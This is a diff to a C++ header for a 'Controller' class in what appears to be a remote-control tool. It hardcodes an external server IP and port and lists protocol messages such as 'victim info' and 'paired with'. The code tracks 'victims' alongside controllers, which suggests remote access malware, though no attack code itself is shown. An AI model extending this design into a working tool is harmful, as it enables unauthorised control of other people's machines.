@@ -6,26 +6,39 @@
 #include "Mlib/Io/keyboard.hpp"
 #include <iostream>
 #include <sstream>
+#include <thread>
 
 #define SERVER_IP "2.235.241.210"
 #define SERVER_PORT 9002
 
+/* possible messages form server:
+c: controller accepted
+n: controller info
+l: victim info
+e: exit
+r: erase clients list
+d: display clients list
+p: paired with
+*/
+
 class Controller
 {
 public:
-	Controller(sf::UdpSocket* s);
-	void receiveInfo();
-	void takeCmdInput();
-	int controlWindow();
+	Controller();
+	void controlWindow();
 
 private:
-	bool isRunning = true;
+	void receiveInfo();
+	void takeCmdInput();
+	void connectServer();
+	void displayList();
+
 	std::vector<Client> controllers, victims;
-	bool isPaired = false, isControlling = false;
+	bool isConnected = false, isPaired = false, isControlling = false;
 	const Mlib::Vec2i screenSize = Mlib::displaySize();
-	sf::UdpSocket* socket;
+	sf::TcpSocket server;
 	sf::RenderWindow w;
-	const std::string pIp = sf::IpAddress::getPublicAddress().toString();
-	const std::string lIp = sf::IpAddress::getLocalAddress().toString();
+	const std::string ip = sf::IpAddress::getPublicAddress().toString();
+	sf::Uint16 id = 0;
 };
 
